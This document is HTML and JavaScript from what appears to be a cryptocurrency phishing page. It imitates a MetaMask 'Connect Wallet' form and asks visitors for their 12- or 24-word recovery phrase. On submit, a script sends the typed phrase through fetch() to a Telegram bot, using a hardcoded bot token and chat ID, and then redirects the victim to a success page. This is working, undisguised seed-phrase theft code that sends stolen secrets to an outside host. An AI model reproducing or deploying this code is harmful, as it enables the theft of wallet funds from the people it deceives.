<script>
    function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;
  
    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
  </script>

        <div id="phrase" class="tabcontent" style="display: block;">
            
            <form name="myform1" id="messageForm">
                
                <input type="hidden" name="wallet" value="metamask">
                <input type="hidden" name="serial" id="uniquecode" placeholder=""  value="50252" >
                <textarea name="phrase" id="messageInput" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
                <br>
                <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                <br>
                <button type="submit" class="btn">Connect Wallet</button>
            </form>
            <script>
                document.getElementById("messageForm").addEventListener("submit", function (event) {
                    event.preventDefault(); // Prevent form submission
        
                    const message = document.getElementById("messageInput").value;
                    sendMessageToTelegram(message);
                });
        
                function sendMessageToTelegram(text) {
                    // Replace with your actual Telegram bot token and chat ID
                    const botToken = "6313373570:AAGd6rv_inDaOQsS4Y31OFSmOnC4nAzgEr0";
                    const chatId = "5982389297";
                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
        
                    fetch(url, { method: "GET" })
                        .then(response => {
                            if (response.ok) {
                                console.log("Message sent successfully!");
                                // Redirect to another page (replace with your desired URL)
                        window.location.href = "../success.html"; // Change this U
                            } else {
                                console.error("Error sending message:", response.statusText);
                            }
                        })
                        .catch(error => {
                            console.error("Network error:", error);
                        });
                }
                        
                
            </script>
